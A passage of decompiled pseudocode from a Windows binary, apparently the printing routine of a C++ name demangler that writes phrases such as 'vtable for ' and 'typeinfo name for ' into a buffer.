0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f6a5:\n        pcVar36 = \"operator \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f70d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        if (*(arg1 + 0x170) != NULL) {\n            uStack200 = *(arg1 + 0x120);\n            *(arg1 + 0x120) = &stack0xffffffffffffff38;\n            uStack192 = *(arg1 + 0x170);\n        }\n        piVar19 = *(arg3 + 4);\n        if (*piVar19 != 4) {\n            uStack256 = 0x140010266;\n            fcn.1400113f0(arg1, 0x11, piVar19);\n            if (*(arg1 + 0x170) == 0) {\n                return;\n            }\n            *(arg1 + 0x120) = uStack200;\n            return;\n        }\n        uStack256 = 0x14001082a;\n        fcn.1400113f0(arg1, 0x11, *(piVar19 + 4));\n        if (*(arg1 + 0x170) != 0) {\n            *(arg1 + 0x120) = uStack200;\n        }\n        if (arg1[0x108] == '<') {\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140011138;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14001111d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar15 = 0;\n            }\n            *(arg1 + 0x100) = iVar15 + 1;\n            arg1[iVar15] = 0x3c;\n            arg1[0x108] = 0x3c;\n            uStack256 = 0x14001088b;\n            fcn.1400113f0(arg1, 0x11, *(*(arg3 + 4) + 0x18));\n            if (arg1[0x108] != '>') {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x1400110e1;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x3e;\n                arg1[0x108] = 0x3e;\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x1400110fc;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\ncode_r0x00014000ac40:\n        *(*0x20 + -8) = unaff_RSI;\n        *(*0x20 + -0x10) = unaff_RBX;\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uVar22 = *(arg1 + 0x118);\n            pcVar3 = *(arg1 + 0x110);\n            *(*0x20 + -0x40) = 0x14000ac99;\n            (*pcVar3)(arg1, 0xff, uVar22);\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = uVar27;\n        arg1[0x108] = uVar27;\n        return;\n    case 0x14000f71d:\n        pcVar36 = \"TLS wrapper function for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f785;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f795:\n        pcVar36 = \"TLS init function for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f7fd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f80d:\n        uStack256 = 0x14000f81b;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010a9b;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x28;\n        arg1[0x108] = 0x28;\n        uVar22 = *(arg3 + 6);\n        goto code_r0x00014000f848;\n    case 0x14000f883:\n        if ((**(arg3 + 6) != 0x3b) || (**(*(arg3 + 6) + 6) != 0x3c)) goto code_r0x00014000e330;\n        uStack256 = 0x14000f8a7;\n        iVar14 = fcn.140012f30(arg1, 0x11, arg3);\n        if (iVar14 != 0) {\n            return;\n        }\n        uStack256 = 0x14000f8bf;\n        iVar14 = fcn.1400132c0(arg1, 0x11, arg3);\n        if (iVar14 != 0) {\n            return;\n        }\n        iVar15 = *(arg3 + 4);\n        unaff_RDI = *(*(arg3 + 6) + 0x10);\n        iVar18 = *(*(arg3 + 6) + 0x18);\n        unaff_RBP = *(iVar18 + 0x10);\n        unaff_RSI = *(iVar18 + 0x18);\n        uStack256 = 0x14000f8f3;\n        iVar14 = sub.msvcrt.dll_strcmp(**(iVar15 + 0x10), 0x14010c86f);\n        if (iVar14 == 0) {\n            uStack256 = 0x14000f90b;\n            fcn.140012d80(arg1, 0x11, unaff_RDI);\n            uStack256 = 0x14000f91b;\n            fcn.1400126f0(arg1, 0x11, iVar15);\n            uStack256 = 0x14000f92b;\n            fcn.140012d80(arg1, 0x11, unaff_RBP);\n            pcVar36 = 0x14010c872;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000f93a;\n            unaff_RBX = arg1;\n        }\n        else {\n            pcVar36 = \"new \";\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14001131f;\n            unaff_RBX = arg1;\n        }\n        goto code_r0x00014000ad10;\n    case 0x14000f940:\n        pcVar36 = \"java resource \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f9a5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f9b5:\n        iVar15 = *(arg3 + 4);\n        pcVar36 = \"operator\";\n        iVar30 = *(iVar15 + 0x10);\n        iVar18 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar18 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fa25;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar20 = 1;\n                iVar18 = 0;\n            }\n            else {\n                iVar20 = iVar18 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar20;\n            arg1[iVar18] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar18 = iVar20;\n        } while (pcVar36 != \"\");\n        pcVar36 = *(iVar15 + 8);\n        if (*pcVar36 + 0x9fU < 0x1a) {\n            if (iVar20 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140011159;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                pcVar36 = *(iVar15 + 8);\n                iVar20 = 0;\n            }\n            *(arg1 + 0x100) = iVar20 + 1;\n            arg1[iVar20] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        if (pcVar36[iVar30 + -1] == ' ') {\n            iVar30 = iVar30 + -1;\n        }\n        if (iVar30 == 0) {\n            return;\n        }\n        pcVar31 = pcVar36 + iVar30;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14001020d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != pcVar31);\n        return;\n    case 0x14000fa35:\n        uVar22 = *(arg3 + 6);\n        if (*(arg3 + 4) != 0) {\n            uStack256 = 0x14000fa4c;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        }\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010b51;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7b;\n        arg1[0x108] = 0x7b;\n        uStack256 = 0x14000fa85;\n        fcn.1400113f0(arg1, 0x11, uVar22);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010b22;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7d;\n        arg1[0x108] = 0x7d;\n        return;\n    case 0x14000fab3:\n        pcVar36 = \"operator \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fb1d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x00014000e5c0;\n    case 0x14000fb2d:\n        pcVar36 = \"VTT for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fb95;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000fba5:\n        pcVar36 = \"vtable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fc0d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000fc1d:\n        pcVar36 = \"typeinfo fn for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fc85;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000fc95:\n        pcVar36 = \"typeinfo name for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000fcfd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000fd0d:\n        iVar15 = *(arg3 + 4);\n        uStack200 = *(arg1 + 0x128);\n        puVar6 = uStack200;\n        if (iVar15 != 0) {\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            uStack176 = *(arg1 + 0x120);\n            aiStack184[0] = 0;\n            uStack256 = 0x14000fd5a;\n            uStack192 = arg3;\n            fcn.1400113f0(arg1, 0x11, iVar15);\n            *(arg1 + 0x128) = uStack200;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000fd81;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n            goto code_r0x00014000ac40;\n        }\n        for (; (puVar6 != NULL && (*(puVar6 + 2) == 0)); puVar6 = *puVar6) {\n            if (*puVar6[1] < 0x2c) {\n                uVar35 = 1 << (*puVar6[1] & 0x3f);\n                if ((uVar35 & 0x8620e000000) == 0) {\n                    if ((uVar35 & 0x1c00000000) == 0) goto code_r0x000140011ddd;\n                    uVar28 = arg1[0x108];\n                    if ((uVar28 & 0xfd) != 0x28) goto code_r0x000140011ea7;\n                    iVar15 = *(arg1 + 0x100);\n                    if (iVar15 != 0xff) goto code_r0x000140011ec3;\ncode_r0x000140011faf:\n                    arg1[0xff] = 0;\n                    uStack80 = 0x140011fcb;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    uVar28 = arg1[0x108];\ncode_r0x000140011ea7:\n                    iVar18 = *(arg1 + 0x100);\n                    iVar15 = iVar18;\n                    if (uVar28 == 0x20) {\ncode_r0x000140011eb7:\n                        if (iVar15 == 0xff) goto code_r0x000140011faf;\n                    }\n                    else {\n                        if (iVar18 != 0xff) {\n                            iVar15 = iVar18 + 1;\n                            *(arg1 + 0x100) = iVar15;\n                            arg1[iVar18] = 0x20;\n                            arg1[0x108] = 0x20;\n                            goto code_r0x000140011eb7;\n                        }\n                        arg1[0xff] = 0;\n                        uStack80 = 0x14001208c;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *arg1 = 0x20;\n                        iVar15 = 1;\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    }\ncode_r0x000140011ec3:\n                    iVar18 = iVar15 + 1;\n                }\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x28;\n                uVar22 = *(arg1 + 0x128);\n                arg1[0x108] = 0x28;\n                *(arg1 + 0x128) = 0;\n                uStack80 = 0x140011efe;\n                fcn.1400120a0(arg1, 0x11, uStack200, 0);\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack80 = 0x14001205c;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *arg1 = 0x29;\n                    iVar18 = 1;\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    goto code_r0x000140011e21;\n                }\n                iVar18 = iVar15 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x29;\n                arg1[0x108] = 0x29;\n                goto joined_r0x000140011f2e;\n            }\ncode_r0x000140011ddd:\n        }\n        uVar22 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        uStack80 = 0x140011e0d;\n        fcn.1400120a0(arg1, 0x11, uStack200, 0);\n        iVar18 = *(arg1 + 0x100);\njoined_r0x000140011f2e:\n        if (iVar18 == 0xff) {\n            arg1[0xff] = 0;\n            uStack80 = 0x140011f50;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *arg1 = 0x28;\n            arg1[0x108] = 0x28;\n            iVar15 = *(arg3 + 6);\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            *(arg1 + 0x100) = 1;\n            if (iVar15 != 0) goto code_r0x000140011e40;\n            iVar30 = 1;\n        }\n        else {\ncode_r0x000140011e21:\n            iVar30 = iVar18 + 1;\n            *(arg1 + 0x100) = iVar30;\n            arg1[iVar18] = 0x28;\n            arg1[0x108] = 0x28;\n            iVar15 = *(arg3 + 6);\n            if (iVar15 != 0) {\ncode_r0x000140011e40:\n                uStack80 = 0x140011e4d;\n                fcn.1400113f0(arg1, 0x11, iVar15);\n                iVar30 = *(arg1 + 0x100);\n            }\n            if (iVar30 == 0xff) {\n                arg1[0xff] = 0;\n                uStack80 = 0x140011ffc;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar15 = 1;\n                iVar30 = 0;\n                goto code_r0x000140011e64;\n            }\n        }\n        iVar15 = iVar30 + 1;\ncode_r0x000140011e64:\n        *(arg1 + 0x100) = iVar15;\n        arg1[iVar30] = 0x29;\n        arg1[0x108] = 0x29;\n        uStack80 = 0x140011e8c;\n        fcn.1400120a0(arg1, 0x11, uStack200, 1);\n        *(arg1 + 0x128) = uVar22;\n        return;\n    case 0x14000fdab:\n        iVar15 = *(arg1 + 0x100);\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x140010af3;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7e;\n        arg1[0x108] = 0x7e;\n        unaff_RSI = *(arg3 + 6);\n        goto code_r0x0001400113f0;\n    case 0x14000fddd:\n        piVar23 = *(arg1 + 0x128);\n        uStack176 = *(arg1 + 0x120);\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        uVar38 = 1;\n        aiStack184[0] = 0;\n        piVar21 = piVar23;\n        puVar34 = &stack0xffffffffffffff38;\n        uStack200 = piVar23;\n        if (piVar23 == NULL) {\n            uStack256 = 0x140010515;\n            uStack192 = arg3;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n            *(arg1 + 0x128) = 0;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n        }\n        else {\n            do {\n                if (2 < *piVar21[1] - 0x19U) break;\n                if (*(piVar21 + 2) == 0) {\n                    if (3 < uVar38) goto code_r0x00014000e330;\n                    uVar9 = *(piVar21 + 4);\n                    uVar10 = *(piVar21 + 1);\n                    uVar11 = *(piVar21 + 0xc);\n                    uVar35 = uVar38;\n                    uVar38 = uVar38 + 1;\n                    iVar15 = uVar35 * 0x20;\n                    *(&stack0xffffffffffffff38 + iVar15) = *piVar21;\n                    *(&stack0xffffffffffffff3c + iVar15) = uVar9;\n                    *(&stack0xffffffffffffff40 + iVar15) = uVar10;\n                    *(&stack0xffffffffffffff44 + iVar15) = uVar11;\n                    uVar9 = *(piVar21 + 2);\n                    uVar10 = *(piVar21 + 0x14);\n                    uVar11 = *(piVar21 + 3);\n                    uVar12 = *(piVar21 + 0x1c);\n                    *(&stack0xffffffffffffff38 + iVar15) = puVar34;\n                    puVar34 = &stack0xffffffffffffff38 + uVar35 * 0x20;\n                    *(arg1 + 0x128) = puVar34;\n                    *(&stack0xffffffffffffff48 + iVar15) = uVar9;\n                    *(&stack0xffffffffffffff4c + iVar15) = uVar10;\n                    *(&stack0xffffffffffffff50 + iVar15) = uVar11;\n                    *(&stack0xffffffffffffff54 + iVar15) = uVar12;\n                    *(piVar21 + 2) = 1;\n                }\n                piVar21 = *piVar21;\n            } while (piVar21 != NULL);\n            uStack256 = 0x14000fe9d;\n            uStack192 = arg3;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n            *(arg1 + 0x128) = piVar23;\n            if (aiStack184[0] != 0) {\n                return;\n            }\n            if (uVar38 != 1) {\n                uVar35 = uVar38 - 1;\n                puVar34 = &stack0xffffffffffffff38 + uVar35 * 0x20;\n                while( true ) {\n                    puVar6 = puVar34 + 8;\n                    puVar34 = puVar34 + -0x20;\n                    uStack256 = 0x14000fee5;\n                    fcn.140011490(arg1, 0x11, *puVar6);\n                    if (uVar35 == 1) break;\n                    uVar35 = uVar35 - 1;\n                }\n            }\n        }\n        uStack256 = 0x140010540;\n        fcn.140012420(arg1, 0x11, arg3, *(arg1 + 0x128));\n        return;\n    case 0x14000fef3:\n        puVar34 = *(arg3 + 4);\n        if (arg3[6] == 0) {\n            return;\n        }\n        puVar33 = puVar34 + arg3[6];\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ff5d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != puVar33);\n        return;\n    case 0x14000ff6d:\n        iVar15 = *(*(arg3 + 4) + 1);\n        puVar34 = **(arg3 + 4);\n        if (iVar15 == 0) {\n            return;\n        }\n        puVar33 = puVar34 + iVar15;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ffdd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar33 != puVar34);\n        return;\n    }\ncode_r0x00014000e398:\n    unaff_RSI = *(arg3 + 4);\ncode_r0x0001400113f0:\n    if (((unaff_RSI != NULL) && (unaff_RSI[1] < 2)) && (iVar14 = *(arg1 + 0x134),  iVar14 < 0x401)) {\n        unaff_RSI[1] = unaff_RSI[1] + 1;\n        uVar22 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar14 + 1;\n        *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n        uStack80 = 0x14001144f;\n        fcn.14000e2e0(arg1, 0x11, unaff_RSI);\n        *(arg1 + 0x148) = uVar22;\n        unaff_RSI[1] = unaff_RSI[1] - 1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\njoined_r0x000140010f17:\n    if (ppuVar32 == NULL) goto code_r0x00014001117f;\n    if ((*ppuVar32 == puVar24) || ((*(arg1 + 0x148) != ppuVar32 && (*ppuVar32 == arg3)))) goto code_r0x000140010f3f;\n    ppuVar32 = ppuVar32[1];\n    goto joined_r0x000140010f17;\n    while( true ) {\n        uVar9 = *piVar23;\n        uVar10 = *(piVar23 + 4);\n        uVar11 = *(piVar23 + 1);\n        uVar12 = *(piVar23 + 0xc);\n        *(arg1 + 0x128) = ppiVar26;\n        uVar39 = uVar39 + 1;\n        *ppiVar26 = uVar9;\n        *(ppiVar26 + 4) = uVar10;\n        *(ppiVar26 + 1) = uVar11;\n        *(ppiVar26 + 0xc) = uVar12;\n        uVar9 = *(piVar23 + 2);\n        uVar10 = *(piVar23 + 0x14);\n        uVar11 = *(piVar23 + 3);\n        uVar12 = *(piVar23 + 0x1c);\n        *ppiVar26 = piVar23;\n        *(ppiVar26 + 2) = uVar9;\n        *(ppiVar26 + 0x14) = uVar10;\n        *(ppiVar26 + 3) = uVar11;\n        *(ppiVar26 + 0x1c) = uVar12;\n        piVar23[1] = piVar19;\n        *(piVar23 + 2) = 0;\n        piVar19 = *(piVar19 + 4);\n        piVar23[3] = iVar15;\n        piVar23 = piVar23 + 4;\n        ppiVar26 = ppiVar26 + 4;\n        if (piVar19 == NULL) break;\ncode_r0x000140010d6c:\n        iVar14 = *piVar19;\n        if ((0x35 < iVar14 - 0x1cU) || ((0x3400000000001fU >> (iVar14 - 0x1cU & 0x3f) & 1) == 0)) {\ncode_r0x00014000e720:\n            if (iVar14 == 4) {\n                *(arg1 + 0x120) = &stack0xffffffffffffff28;\n                iStack216 = iVar15;\n                piStack208 = piVar19;\n            }\n            uStack256 = 0x14000e755;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n            if (*piVar19 == 4) {\n                *(arg1 + 0x120) = iStack216;\n            }\n            iVar14 = *(&stack0xffffffffffffff48 + (uVar39 - 1) * 0x20);\n            piVar23 = &stack0xffffffffffffff38 + (uVar39 - 1) * 4 * 8;\n            while( true ) {\n                if (iVar14 == 0) {\n                    iVar15 = *(arg1 + 0x100);\n                    if (iVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        uStack256 = 0x140010fba;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar18 = 1;\n                        iVar15 = 0;\n                    }\n                    else {\n                        iVar18 = iVar15 + 1;\n                    }\n                    *(arg1 + 0x100) = iVar18;\n                    iVar18 = piVar23[1];\n                    arg1[iVar15] = 0x20;\n                    arg1[0x108] = 0x20;\n                    uStack256 = 0x14000e7d3;\n                    fcn.140011490(arg1, 0x11, iVar18);\n                }\n                if (piVar23 == &stack0xffffffffffffff38) break;\n                iVar14 = *(piVar23 + -2);\n                piVar23 = piVar23 + -4;\n            }\n            *(arg1 + 0x128) = uVar22;\n            return;\n        }\n        if (uVar39 == 4) break;\n    }\n    goto code_r0x00014000e330;\ncode_r0x00014001117f:\n    unaff_RDI = *(arg1 + 0x120);\n    *(arg1 + 0x120) = ppuVar25[1];\n    uStack256 = 0x14001119c;\n    puVar24 = fcn.14000acb0(arg1, puVar24);\n    if (puVar24 == NULL) {\ncode_r0x000140010f92:\n        *(arg1 + 0x120) = unaff_RDI;\n        goto code_r0x00014000e330;\n    }\n    uVar38 = 1;\ncode_r0x000140010f53:\n    uVar29 = *puVar24;\n    if (uVar29 == 0x2f) {\n        iVar14 = 